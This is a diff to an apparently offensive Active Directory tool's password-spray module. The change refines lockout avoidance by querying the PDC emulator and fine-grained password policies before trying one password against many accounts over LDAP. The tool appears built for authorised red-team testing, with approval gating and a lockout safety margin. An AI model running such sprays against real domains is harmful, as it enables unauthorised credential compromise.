@@ -17,8 +17,15 @@ from ldap3 import SUBTREE, Connection, Server
 from rich.console import Console
 
 from adaf_attack.core.graph import AttackGraph
-from adaf_attack.core.ldap_ops import ldap_filter_value
 from adaf_attack.core.ldap_util import ldap_connect
+from adaf_attack.core.lockout import (
+    account_lockout_state,
+    domain_has_pso,
+    effective_lockout_threshold,
+    filetime_to_dt,
+    locate_pdc_emulator,
+    read_domain_lockout_policy,
+)
 from adaf_attack.core.registry import (
     ApprovalPolicy,
     RiskLevel,
@@ -32,28 +39,8 @@ from adaf_attack.core.target import Target
 console = Console()
 
 
-def _filetime_to_dt(ft: int) -> datetime | None:
-    if not ft or ft <= 0:
-        return None
-    return datetime.fromtimestamp(ft / 10_000_000 - 11644473600, tz=UTC)
-
-
-def _read_lockout_policy(conn: Any, base_dn: str) -> dict[str, int]:
-    conn.search(
-        base_dn,
-        "(objectClass=domain)",
-        search_scope=SUBTREE,
-        attributes=["lockoutThreshold", "lockoutObservationWindow", "minPwdLength"],
-    )
-    policy = {"lockout_threshold": 0, "observation_window_seconds": 0}
-    if conn.entries:
-        entry = conn.entries[0]
-        if entry.lockoutThreshold:
-            policy["lockout_threshold"] = int(entry.lockoutThreshold.value)
-        if entry.lockoutObservationWindow:
-            raw = int(entry.lockoutObservationWindow.value)
-            policy["observation_window_seconds"] = int(abs(raw) / 10_000_000)
-    return policy
+_filetime_to_dt = filetime_to_dt
+_read_lockout_policy = read_domain_lockout_policy
 
 
 def _load_users(source: str | None, conn: Any, base_dn: str, filter_expr: str | None) -> list[str]:
@@ -78,17 +65,10 @@ def _load_users(source: str | None, conn: Any, base_dn: str, filter_expr: str | 
 
 
 def _account_lockout_state(conn: Any, base_dn: str, sam: str) -> tuple[int, datetime | None]:
-    conn.search(
-        base_dn,
-        f"(sAMAccountName={ldap_filter_value(sam)})",
-        search_scope=SUBTREE,
-        attributes=["badPwdCount", "badPasswordTime"],
-    )
-    if not conn.entries:
+    try:
+        bad, ts, _pso = account_lockout_state(conn, base_dn, sam, require_pso=False)
+    except RuntimeError:
         return 0, None
-    entry = conn.entries[0]
-    bad = int(entry.badPwdCount.value) if entry.badPwdCount else 0
-    ts = _filetime_to_dt(int(entry.badPasswordTime.value)) if entry.badPasswordTime else None
     return bad, ts
 
 
@@ -143,10 +123,6 @@ class PasswordSpray:
         console.print(f"[bold]Password spray[/bold] → {target.domain} @ {target.dc_ip}")
         conn, base_dn, _ = ldap_connect(target)
         policy = _read_lockout_policy(conn, base_dn)
-        console.print(
-            f"Policy: threshold={policy['lockout_threshold']}  "
-            f"window={policy['observation_window_seconds']}s"
-        )
         users = _load_users(users_source, conn, base_dn, user_filter)
         if max_attempts and len(users) > max_attempts:
             users = users[:max_attempts]
@@ -159,22 +135,48 @@ class PasswordSpray:
                 "Password spray requires a verified non-zero lockoutThreshold; "
                 "refusing to continue when lockout policy is unavailable or disabled."
             )
+        pdc_host = locate_pdc_emulator(conn, base_dn)
+        pso_present = domain_has_pso(conn, base_dn)
+        console.print(
+            f"Policy: threshold={policy['lockout_threshold']}  "
+            f"window={policy['observation_window_seconds']}s  pdc={pdc_host}"
+        )
+        if pdc_host.lower() == str(target.dc_ip or "").lower():
+            pdc_conn, pdc_base = conn, base_dn
+        else:
+            pdc_conn, pdc_base, _ = ldap_connect(
+                Target(
+                    domain=target.domain,
+                    dc_ip=pdc_host,
+                    username=target.username,
+                    password=target.password,
+                    hashes=target.hashes,
+                    aes_key=target.aes_key,
+                    ccache=target.ccache,
+                    use_kerberos=target.use_kerberos,
+                    ldaps=target.ldaps,
+                    starttls=target.starttls,
+                )
+            )
         attempts: list[dict[str, Any]] = []
         hits: list[dict[str, Any]] = []
 
         for sam in users:
-            bad, _last_ts = _account_lockout_state(conn, base_dn, sam)
-            safe_ceiling = threshold - safety_margin
-            if threshold and bad >= safe_ceiling:
+            bad, _last_ts, pso_threshold = account_lockout_state(
+                pdc_conn, pdc_base, sam, require_pso=pso_present
+            )
+            effective = effective_lockout_threshold(threshold, pso_threshold)
+            safe_ceiling = effective - safety_margin
+            if effective <= 0 or bad >= safe_ceiling:
                 attempts.append(
                     {
                         "sam": sam,
                         "skipped": "at_or_near_lockout",
                         "bad_pwd_count": bad,
-                        "threshold": threshold,
+                        "threshold": effective,
                     }
                 )
-                console.print(f"  [yellow]skip[/yellow] {sam} bad={bad}/{threshold}")
+                console.print(f"  [yellow]skip[/yellow] {sam} bad={bad}/{effective}")
                 continue
             ok, note = _try_bind(target, sam, password, target.ldaps)
             record = {
@@ -195,10 +197,13 @@ class PasswordSpray:
                 console.print(f"  [dim]miss[/dim] {sam}")
             if delay_seconds:
                 time.sleep(delay_seconds)
+        if pdc_conn is not conn:
+            pdc_conn.unbind()
         conn.unbind()
 
         result = {
             "domain": target.domain,
+            "pdc": pdc_host,
             "policy": policy,
             "attempts": attempts,
             "hits": hits,
